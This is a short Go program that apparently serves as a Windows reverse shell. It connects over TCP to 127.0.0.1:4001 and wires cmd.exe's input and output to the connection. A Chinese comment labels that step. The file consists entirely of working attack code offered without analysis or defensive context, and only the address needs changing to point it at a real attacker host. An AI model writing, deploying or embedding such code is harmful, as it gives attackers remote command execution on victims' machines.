package main

import (
	"net"
	"os/exec"
)

func main() {
	conn, err := net.Dial("tcp", "127.0.0.1:4001")
	if err != nil {
		return
	}
	defer conn.Close()

	// 创建一个命令行实例，绑定到连接
	cmd := exec.Command("cmd.exe")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
